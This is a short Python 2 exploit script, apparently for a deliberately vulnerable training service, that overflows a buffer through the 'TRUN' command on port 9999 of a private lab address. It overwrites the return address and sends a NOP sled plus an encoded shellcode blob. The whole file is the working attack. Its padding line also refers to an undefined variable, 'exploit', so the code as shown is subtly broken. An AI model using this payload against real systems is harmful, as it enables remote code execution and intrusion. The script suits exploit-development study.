import socket

target = '192.168.192.133'
port = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nops = '\x90' * 32
shellcode = ''

buf =  ""
buf += "\xb8\xef\x3b\x3b\xc8\xda\xd5\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x30\x31\x42\x13\x83\xea\xfc\x03\x42\xe0\xd9"
buf += "\xce\x34\x16\x9f\x31\xc5\xe6\xc0\xb8\x20\xd7\xc0\xdf"
buf += "\x21\x47\xf1\x94\x64\x6b\x7a\xf8\x9c\xf8\x0e\xd5\x93"
buf += "\x49\xa4\x03\x9d\x4a\x95\x70\xbc\xc8\xe4\xa4\x1e\xf1"
buf += "\x26\xb9\x5f\x36\x5a\x30\x0d\xef\x10\xe7\xa2\x84\x6d"
buf += "\x34\x48\xd6\x60\x3c\xad\xae\x83\x6d\x60\xa5\xdd\xad"
buf += "\x82\x6a\x56\xe4\x9c\x6f\x53\xbe\x17\x5b\x2f\x41\xfe"
buf += "\x92\xd0\xee\x3f\x1b\x23\xee\x78\x9b\xdc\x85\x70\xd8"
buf += "\x61\x9e\x46\xa3\xbd\x2b\x5d\x03\x35\x8b\xb9\xb2\x9a"
buf += "\x4a\x49\xb8\x57\x18\x15\xdc\x66\xcd\x2d\xd8\xe3\xf0"
buf += "\xe1\x69\xb7\xd6\x25\x32\x63\x76\x7f\x9e\xc2\x87\x9f"
buf += "\x41\xba\x2d\xeb\x6f\xaf\x5f\xb6\xe5\x2e\xed\xcc\x4b"
buf += "\x30\xed\xce\xfb\x59\xdc\x45\x94\x1e\xe1\x8f\xd1\xd1"
buf += "\xab\x92\x73\x7a\x72\x47\xc6\xe7\x85\xbd\x04\x1e\x06"
buf += "\x34\xf4\xe5\x16\x3d\xf1\xa2\x90\xad\x8b\xbb\x74\xd2"
buf += "\x38\xbb\x5c\xb1\xdf\x2f\x3c\x36"

shellcode = buf

padding = 'B' * (3000 - 2006 - 4 - 32 - len(exploit))
attack = prefix + eip + nops + shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((target,port))
print s.recv(1024)
print " [+] sending attack on TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

